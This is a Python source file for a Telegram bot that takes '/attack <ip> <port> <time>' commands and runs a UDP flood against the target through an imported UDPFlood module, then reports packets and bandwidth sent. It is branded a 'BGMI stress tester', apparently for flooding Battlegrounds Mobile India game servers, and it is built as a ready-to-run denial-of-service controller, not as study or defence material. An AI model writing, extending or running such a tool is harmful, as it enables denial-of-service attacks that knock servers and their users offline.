#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import logging
import sys
import os
import time
from datetime import datetime
from telethon import TelegramClient, events, Button
from colorama import Fore, Style, init

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

import config
from modules.udp_flood import UDPFlood
from modules.utils import AttackUtils

init(autoreset=True)

# Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

print(AttackUtils.get_banner())

# ✅ Bot object
bot = TelegramClient(
    os.path.join(config.SESSION_DIR, 'bot'),
    config.API_ID,
    config.API_HASH
)

# ✅ UDP Attacker
bgmi_attacker = UDPFlood()
active_attack = None
attack_start_time = None
current_target = {}

def is_authorized(user_id):
    return user_id in config.AUTHORIZED_USERS

# ============================================
# ⚔️ /attack COMMAND
# ============================================
@bot.on(events.NewMessage(pattern='/attack'))
async def attack_command(event):
    global active_attack, attack_start_time, current_target
    
    if not is_authorized(event.sender_id):
        await event.reply("❌ **Access Denied!** Aap authorized nahi hain.")
        return
    
    sender_id = event.sender_id
    
    # Check if already attacking
    if active_attack is not None:
        elapsed = time.time() - attack_start_time
        remaining = current_target.get('time', 0) - elapsed
        await event.reply(
            f"⚠️ **ATTACK ALREADY RUNNING!**\n\n"
            f"🎯 Target: `{current_target['ip']}:{current_target['port']}`\n"
            f"⏱️ Elapsed: `{elapsed:.0f}s`\n"
            f"⏱️ Remaining: `{remaining:.0f}s`\n"
            f"⏱️ Total: `{current_target['time']}s`\n\n"
            f"🛑 Stop: `/stop`"
        )
        return
    
    # Parse command
    parts = event.text.split()
    
    # Show usage if wrong format
    if len(parts) != 4:
        await event.reply(
            "⚠️ **Usage:** `/attack <ip> <port> <time>`\n\n"
            "**Example:** `/attack 192.168.1.1 8080 60`\n\n"
            "📋 **Parameters:**\n"
            "• IP: Target IP address\n"
            "• Port: Target port (1-65535)\n"
            "• Time: Duration in seconds\n\n"
            f"⏱️ Max time: {config.MAX_DURATION}s"
        )
        return
    
    target_ip = parts[1]
    
    # Validate port
    try:
        target_port = int(parts[2])
        if target_port < 1 or target_port > 65535:
            await event.reply("❌ Invalid port! (1-65535)")
            return
    except ValueError:
        await event.reply("❌ Port must be a number!")
        return
    
    # Validate time
    try:
        attack_time = int(parts[3])
        if attack_time < 1:
            await event.reply("❌ Time must be at least 1 second!")
            return
        if attack_time > config.MAX_DURATION:
            await event.reply(f"❌ Max time is {config.MAX_DURATION} seconds!")
            return
    except ValueError:
        await event.reply("❌ Time must be a number!")
        return
    
    # Save target info
    current_target = {
        'ip': target_ip,
        'port': target_port,
        'time': attack_time
    }
    
    # 🔥 ATTACK STARTING
    start_msg = await event.reply(
        f"🔥 **ATTACK STARTED!** 🔥\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 **Target:** `{target_ip}:{target_port}`\n"
        f"⏱️ **Time:** `{attack_time}s`\n"
        f"📡 **Type:** UDP Flood\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⏳ Initializing...\n"
        f"🔄 Connecting to target...\n"
        f"📤 Sending packets...\n\n"
        f"🛑 Stop: `/stop`"
    )
    
    # Mark attack as active
    active_attack = True
    attack_start_time = time.time()
    
    try:
        # Run attack
        import concurrent.futures
        loop = asyncio.get_event_loop()
        
        with concurrent.futures.ThreadPoolExecutor() as pool:
            report = await loop.run_in_executor(
                pool,
                bgmi_attacker.start_attack,
                target_ip,
                target_port,
                config.MAX_THREADS,
                attack_time
            )
        
        # Attack completed
        elapsed_str = AttackUtils.format_time(report['elapsed'])
        
        # ✅ SUCCESS
        result_msg = (
            f"✅ **ATTACK COMPLETED!** ✅\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 **ATTACK REPORT**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🎯 **Target:** `{target_ip}:{target_port}`\n"
            f"⏱️ **Duration:** `{elapsed_str}`\n\n"
            f"📦 Packets Sent: `{report['packets']:,}`\n"
            f"📤 Data Sent: `{AttackUtils.format_bytes(report['bytes'])}`\n"
            f"🔗 Connections: `{report['connections']:,}`\n"
            f"⚡ Packet Rate: `{report['packet_rate']:.2f} pkt/s`\n"
            f"📶 Bandwidth: `{report['mbps']:.2f} Mbps`\n"
            f"❌ Errors: `{report['errors']}`\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🟢 **Status:** SUCCESS ✅\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔄 New: `/attack IP PORT TIME`"
        )
        
        await start_msg.edit(result_msg)
        
    except Exception as e:
        # ❌ FAILED
        elapsed = time.time() - attack_start_time
        
        error_msg = (
            f"❌ **ATTACK FAILED!** ❌\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 **Target:** `{target_ip}:{target_port}`\n"
            f"⏱️ **Time Elapsed:** `{elapsed:.0f}s`\n"
            f"🔴 **Error:** `{str(e)}`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💡 **Possible Issues:**\n"
            f"• Target unreachable\n"
            f"• Firewall blocking\n"
            f"• Port closed\n"
            f"• Network error\n\n"
            f"🔄 Retry: `/attack {target_ip} {target_port} {attack_time}`"
        )
        
        await start_msg.edit(error_msg)
    
    finally:
        # Clear attack state
        active_attack = None
        attack_start_time = None
        current_target = {}

# ============================================
# /stop COMMAND
# ============================================
@bot.on(events.NewMessage(pattern='/stop'))
async def stop_command(event):
    global active_attack, attack_start_time, current_target
    
    if not is_authorized(event.sender_id):
        await event.reply("❌ Access Denied!")
        return
    
    if active_attack is not None:
        elapsed = time.time() - attack_start_time
        
        # Stop attack
        bgmi_attacker.stop_attack()
        
        stop_msg = (
            f"⛔ **ATTACK STOPPED!** ⛔\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 **Target:** `{current_target['ip']}:{current_target['port']}`\n"
            f"⏱️ **Ran for:** `{elapsed:.0f}s`\n"
            f"⏱️ **Planned:** `{current_target['time']}s`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"✅ Connections closed.\n"
            f"🔄 New: `/attack IP PORT TIME`"
        )
        
        await event.reply(stop_msg)
        
        # Clear state
        active_attack = None
        attack_start_time = None
        current_target = {}
    else:
        await event.reply(
            "💤 **No active attack!**\n\n"
            "Start: `/attack IP PORT TIME`"
        )

# ============================================
# /status COMMAND
# ============================================
@bot.on(events.NewMessage(pattern='/status'))
async def status_command(event):
    if not is_authorized(event.sender_id):
        return
    
    if active_attack is not None:
        elapsed = time.time() - attack_start_time
        remaining = current_target['time'] - elapsed
        
        await event.reply(
            f"📊 **ATTACK STATUS** 📊\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🟢 **Status:** RUNNING 🔥\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🎯 Target: `{current_target['ip']}:{current_target['port']}`\n"
            f"⏱️ Elapsed: `{elapsed:.0f}s`\n"
            f"⏱️ Remaining: `{remaining:.0f}s`\n"
            f"⏱️ Total: `{current_target['time']}s`\n\n"
            f"🛑 Stop: `/stop`"
        )
    else:
        await event.reply(
            "💤 **IDLE** - No attack running\n\n"
            "Start: `/attack IP PORT TIME`"
        )

# ============================================
# /start COMMAND
# ============================================
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    if not is_authorized(event.sender_id):
        await event.reply("❌ **Access Denied!**")
        return
    
    await event.reply(
        f"🔥 **BGMI STRESS TESTER** 🔥\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⚔️ **ATTACK COMMAND:**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"`/attack <ip> <port> <time>`\n\n"
        f"📋 **Example:**\n"
        f"`/attack 192.168.1.1 8080 60`\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 **Commands:**\n"
        f"• `/attack` - Start attack\n"
        f"• `/status` - Check status\n"
        f"• `/stop` - Stop attack\n"
        f"• `/start` - This menu\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⏱️ Max time: {config.MAX_DURATION}s\n"
        f"⚠️ Authorized use only!"
    )

# ============================================
# MAIN
# ============================================
async def main():
    await bot.start(bot_token=config.BOT_TOKEN)
    
    print(f"{Fore.GREEN}[✓] Bot Started!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[+] Command: /attack IP PORT TIME{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[+] Max Time: {config.MAX_DURATION}s{Style.RESET_ALL}")
    print("-" * 50)
    
    await bot.run_until_disconnected()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Bot stopped.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
